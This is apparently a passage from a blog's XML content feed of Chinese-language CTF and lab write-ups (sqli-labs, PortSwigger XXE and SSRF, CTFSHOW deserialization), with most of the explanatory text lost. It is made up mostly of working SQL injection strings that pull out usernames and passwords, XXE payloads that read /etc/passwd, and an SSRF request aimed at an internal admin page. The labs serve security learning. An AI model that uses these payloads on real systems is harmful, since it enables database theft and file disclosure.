alt="2"><br><img src="https://img-blog.csdnimg.cn/46eed84728fa4bfebb41527d8d279a42.png" alt="3"><br>selectHandlerhandler<code>1&#39;;Handler FlagHere OPEN;Handler FlagHere read first;Handler FlagHere close;#</code><br>flag<br><img src="https://img-blog.csdnimg.cn/7137dd4295444e049d06c952d5a736e5.png" alt="4"></p>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs</title>
      <link href="/2023/03/13/sqli-labs/"/>
      <url>/2023/03/13/sqli-labs/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="less-03"><a href="#less-03" class="headerlink" title="less-03"></a>less-03</h2><p>**)**</p><blockquote><p> <code>1&#39;) order by 3--+</code></p><p> <code>1&#39;) union select 1,2,database()--+</code></p><p> <code>-1&#39;) union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()--+</code></p><p> <code>1&#39;) union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;users&#39;--+</code></p><p> <code>1&#39;) union select 1,2,group_concat(id,username,password) FROM users--+</code></p></blockquote><h2 id="less-04"><a href="#less-04" class="headerlink" title="less -04"></a>less -04</h2><p>**)**</p><h2 id="less-9-"><a href="#less-9-" class="headerlink" title="less-9()"></a>less-9()</h2><p><strong></strong><br> <strong></strong><br> if<code>if(1=2,1,sleep(2))--+</code><br><strong>1&#x3D;2</strong>1sleep(2)<strong>sleep(2)<strong><br><code>http://localhost:1000/sqli-labs/Less-9/?id=-1&#39; or if(1=2,1,sleep(2))--+</code><br><strong></strong><br></strong>You are in..<strong></strong>?id&#x3D;1 and if(length(database())&gt;8,sleep(2),0) +<strong>828.<br></strong>?id&#x3D;1 and if(ascii(substr(database(),1,1))&#x3D;115,sleep(2),1)+</strong><br>ascii115<strong>security</strong><br><strong></strong></p><p><code>?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=security limit x,y),z,d))=e,sleep(1),0)+</code></p><blockquote><p>xx+1yx+1yzdzd</p></blockquote><p><strong></strong></p><p><code>?id=1 and If(ascii(substr((select column_name from information_schema.columns where table_name=users and table_schema=database() limit x,y),z,d))=105,sleep(2),1)+</code></p><blockquote><p>xx+1yx+1yzx+1dz</p></blockquote><p></p><h2 id="less-10"><a href="#less-10" class="headerlink" title="less 10"></a>less 10</h2><p>****</p><h2 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h2><p><code>-1&#39; or 1=1#</code><br><code>admin&#39; order by 2#</code><code>admin&#39; order by 3#</code><br><img src="https://img-blog.csdnimg.cn/c20c6ec4119c4561a4426a6ea998b3f6.png" alt="1"><br></p><h2 id="less-17"><a href="#less-17" class="headerlink" title="less 17"></a>less 17</h2><p></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//including the Mysql connect parameters.</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"../sql-connections/sql-connect.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check_input</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// truncation (see comments)</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//15</span><span class="token punctuation">&#125;</span><span class="token comment">// Stripslashes if magic quotes enabled</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">/*get_magic_quotes_gpc()  '"\\0\n\r\t\x0B*/</span><span class="token punctuation">&#123;</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span><span class="token punctuation">&#125;</span><span class="token comment">// Quote if not a number</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ctype_digit</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"'"</span> <span class="token operator">.</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span><span class="token comment">//mysql_real_escape_string</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// take the variables</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//making sure uname is not injectable</span><span class="token variable">$uname</span><span class="token operator">=</span><span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//logging the connection parameters to a file for analysis.</span><span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'result.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'User Name:'</span><span class="token operator">.</span><span class="token variable">$uname</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'New Password:'</span><span class="token operator">.</span><span class="token variable">$passwd</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// connectivity </span>@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username= <span class="token interpolation"><span class="token variable">$uname</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mysql_fetch_array()  false</span><span class="token comment">//echo $row;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//echo '&lt;font color= "</span><span class="token comment">#0000ff">';</span><span class="token variable">$row1</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//echo 'Your Login name:'. $row1;</span><span class="token variable">$update</span><span class="token operator">=</span><span class="token string double-quoted-string">"UPDATE users SET password = '<span class="token interpolation"><span class="token variable">$passwd</span></span>' WHERE username='<span class="token interpolation"><span class="token variable">$row1</span></span>'"</span><span class="token punctuation">;</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$update</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 3 >'</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//******************************</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>&lt;/br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 3 >'</span><span class="token punctuation">;</span><span class="token comment">//echo " You password has been successfully updated " ;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/flag1.jpg"   />'</span><span class="token punctuation">;</span><span class="token comment">//echo 'Your Password:' .$row['password'];</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span>  <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="4.5" color="#FFFF00">'</span><span class="token punctuation">;</span><span class="token comment">//echo "Bug off you Silly Dumb hacker";</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/slap1.jpg"   />'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h3><p>extractvalue(XML_document,XPath_string)</p><p>XML_documentStringXMLDoc</p><p>XPath_string (Xpath) Xpath</p><p>XML_documentXPATH_stringXPath_stringconcatgroup_concat<code>0x5c</code><code>\\</code>16.</p><blockquote><p>1 and (extractvalue(1,concat(0x5c,version(),0x5c)))#    <br>1 and (extractvalue(1,concat(0x5c,database(),0x5c)))#   <br>1 and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x5c)))#   <br>1 and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;users),0x5c)))#<br><br>1 and (extractvalue(1,concat(0x5c,(select password from (select password from users where username&#x3D;admin1) b) ,0x5c)))#      mysql<br>1 and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))#                      </p></blockquote><p><strong>mysql</strong><strong></strong></p><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><p>UPDATEXML (XML_document, XPath_string, new_value)</p><p>XML_documentStringXMLDoc</p><p>XPath_string (Xpath) Xpath</p><p>new_valueString</p><p>XML_documentXPATH_string</p><blockquote><p>123 and (updatexml(1,concat(0x5c,version(),0x5c),1))#     <br>123 and (updatexml(1,concat(0x5c,database(),0x5c),1))#    </p></blockquote><blockquote><p>123 and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x5c),1))#      <br>123 and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;security and table_name &#x3D;users),0x5c),1))#<br></p></blockquote><blockquote><p>123 and (updatexml(1,concat(0x5c,(select password from (select password from users where username&#x3D;admin1) b),0x5c),1))#<br>mysql<br>emails<br>123 and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;security and table_name &#x3D;emails),0x5c),1))#</p></blockquote><blockquote><p>1 and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))#   </p></blockquote><h3 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h3><blockquote><p>123 and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)<em>2)))#     <br>123 and (select count(</em>) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#      </p></blockquote><blockquote><p>1 and (select count(*) from information_schema.tables where table_schema&#x3D;database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),0x7e,floor(rand(0)<em>2)))#    limit<br>1 and (select count(</em>) from information_schema.tables where table_schema&#x3D;database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e,floor(rand(0)*2)))#        </p></blockquote><blockquote><p>1 and (select count(*) from information_schema.columns where table_schema&#x3D;database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;users),0x7e,floor(rand(0)<em>2)))#    <br>1 and (select count(</em>) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#    </p></blockquote><blockquote><p>1 and (select 1 from(select count(*) from information_schema.columns where table_schema&#x3D;database() group by concat(0x7e,(select password from users where username&#x3D;admin1),0x7e,floor(rand(0)*2)))a)#    </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PortSwigger-XXE</title>
      <link href="/2023/03/11/PortSwigger-XXE/"/>
      <url>/2023/03/11/PortSwigger-XXE/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="-XML-"><a href="#-XML-" class="headerlink" title=" XML "></a> XML </h2><p>XML  XXE Web  XML </p><p> XXE (SSRF)  XXE </p><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p> XML  API  XML XXE  XML <br>XML  XML  DTD  URL </p><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><h3 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h3><p>XML XML  HTML XML  HTML XML XML AJAXXXML JSON </p><h3 id="-XML-"><a href="#-XML-" class="headerlink" title=" XML "></a> XML </h3><p>XML  XML XML <code>&amp;lt;</code><code>&amp;gt;</code>&lt;&gt; XML </p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>XML  (DTD)  XML DTD DOCTYPEXML DTD  DTD DTD</p><h3 id="-XML-"><a href="#-XML-" class="headerlink" title=" XML "></a> XML </h3><p>XML  DTD </p><blockquote><p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY myentity &quot;my entity value&quot; &gt; ]&gt;</code><br> XML &amp;myentity; my entity value</p></blockquote><h3 id="-XML-"><a href="#-XML-" class="headerlink" title=" XML "></a> XML </h3><p>XML  DTD </p><p>SYSTEM URL</p><blockquote><p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;http://normal-website.com&quot; &gt; ]&gt;</code><br>URL file:&#x2F;&#x2F;</p></blockquote><blockquote><p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; ]&gt;</code></p></blockquote><h2 id="XXESSRF"><a href="#XXESSRF" class="headerlink" title="XXESSRF"></a>XXESSRF</h2><p><img src="https://img-blog.csdnimg.cn/61f07784b7f245fd8f31186f0f1043f3.png" alt="1"><strong></strong>POSTXML<br><img src="https://img-blog.csdnimg.cn/6afd2b71181c40dca1a5c0ca2efe8f27.png" alt="1"><br>XXE</p><p><img src="https://img-blog.csdnimg.cn/3a23d819d8834ca6aee716adc370b6f6.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/ea03a4027ab14aa79ec1121e48d6c6f0.png" alt="3"><br>ACCESSkeyid<br><img src="https://img-blog.csdnimg.cn/9fc4a18f08df4f498ec23ab9850abc09.png" alt="5"></p><h2 id="Xinclude"><a href="#Xinclude" class="headerlink" title="Xinclude"></a>Xinclude</h2><p>XInclude  XML  XML  XML  XML </p><p> XIncludeXML  XML  XML </p><p>XInclude  XML </p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">xmlns:xi="http://www.w3.org/2001/XInclude"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>XInclude  URI </p><p> XInclude </p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xi:</span>include</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>external.xml<span class="token punctuation">"</span></span> <span class="token attr-name">parse</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xml<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> XInclude  include-by-value</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xi:</span>include</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>external.xml<span class="token punctuation">"</span></span> <span class="token attr-name">parse</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>XInclude  XML  XML  XML </p><p> XML  SOAP  SOAP </p><p> XXE  XML <code>DOCTYPE</code><code>XInclude</code><code>XInclude</code> XML  XML <code>XInclude</code> XML  XML </p><p><code>XInclude</code><code>XInclude</code></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XInclude<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xi:</span>include</span> <span class="token attr-name">parse</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file:///etc/passwd<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="-XXE-"><a href="#-XXE-" class="headerlink" title=" XXE "></a> XXE </h2><p> XML  XML  XML  DOCX SVG</p><p> PNG  JPEG  SVG  SVG  XML SVG  XXE </p><p><code>&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;</code></p>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title> SSRF </title>
      <link href="/2023/03/10/%E9%80%9A%E8%BF%87%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91%E7%BB%95%E8%BF%87-SSRF-%E8%BF%87%E6%BB%A4%E5%99%A8/"/>
      <url>/2023/03/10/%E9%80%9A%E8%BF%87%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91%E7%BB%95%E8%BF%87-SSRF-%E8%BF%87%E6%BB%A4%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="-SSRF-"><a href="#-SSRF-" class="headerlink" title=" SSRF "></a> SSRF </h2><p></p><p> SSRF  URL  SSRF  URL  HTTP  API  URL</p><p> URL</p><blockquote><p>&#x2F;product&#x2F;nextProduct?currentProductId&#x3D;6&amp;path&#x3D;<a href="http://evil-user.net/">http://evil-user.net</a></p><p></p></blockquote><blockquote><p><a href="http://evil-user.net/">http://evil-user.net</a></p><p>URLSSRF</p></blockquote><blockquote><p>POST &#x2F;product&#x2F;stock HTTP&#x2F;1.0<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 118</p><p>stockApi&#x3D;<a href="http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin">http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin</a></p></blockquote><p> SSRF stockAPIURL  URL URL </p><p><img src="https://img-blog.csdnimg.cn/b4f66ec9c7e141559dcda56eb0c4d290.png" alt="1"><br><br><img src="https://img-blog.csdnimg.cn/a3dfeecba0264eae985665d931c208dc.png" alt="2"><br>bp<br><img src="https://img-blog.csdnimg.cn/f9443ac138fa44038a6e14964f76223f.png" alt="2"><br>url<br><img src="https://img-blog.csdnimg.cn/b79f6f94ab294bfdba0e2ff7120e77dc.png" alt="3"><br><br><img src="https://img-blog.csdnimg.cn/ca3696e6f3df4d00b88f4ee58d5d8b3a.png" alt="2"><br>GETstockapi<br><img src="https://img-blog.csdnimg.cn/e3c347adb82a4416b369238ce4d8689c.png" alt="4"><br>path<br><img src="https://img-blog.csdnimg.cn/19fc3e9644984ea49b28a1ec8cb0233c.png" alt="5"><br><br><img src="https://img-blog.csdnimg.cn/b151769e345a447eaa8b0fc724cd368e.png" alt="6"></p>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/03/09/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2%E7%BD%91%E9%A1%B5%E5%9B%BE%E7%89%87%E5%9C%A8%E9%83%A8%E7%BD%B2%E5%90%8E%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2023/03/09/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2%E7%BD%91%E9%A1%B5%E5%9B%BE%E7%89%87%E5%9C%A8%E9%83%A8%E7%BD%B2%E5%90%8E%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>csdnhexohexo</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><p><img src="https://img-blog.csdnimg.cn/5616d0a30e614287881b0ae1a13cb8ff.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-</title>
      <link href="/2023/03/08/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/03/08/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string 